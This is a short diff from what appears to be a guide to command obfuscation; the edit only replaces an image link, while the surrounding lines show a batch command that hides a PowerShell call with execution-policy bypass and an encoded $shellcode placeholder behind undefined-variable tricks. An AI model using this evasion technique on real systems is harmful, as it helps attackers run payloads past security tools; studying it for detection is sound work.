@@ -237,7 +237,7 @@ String obfuscated<br />
       %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
       exit
 
-![batch obfuscation](http://i65.tinypic.com/16j287c.jpg)<br />
+![two](https://user-images.githubusercontent.com/23490060/95485321-769b7080-0989-11eb-9861-ddeaa86481de.png)<br />
 `HINT: Undefined variables technic are only accessible in bat scripting (it will not work in terminal)`
 
 ---
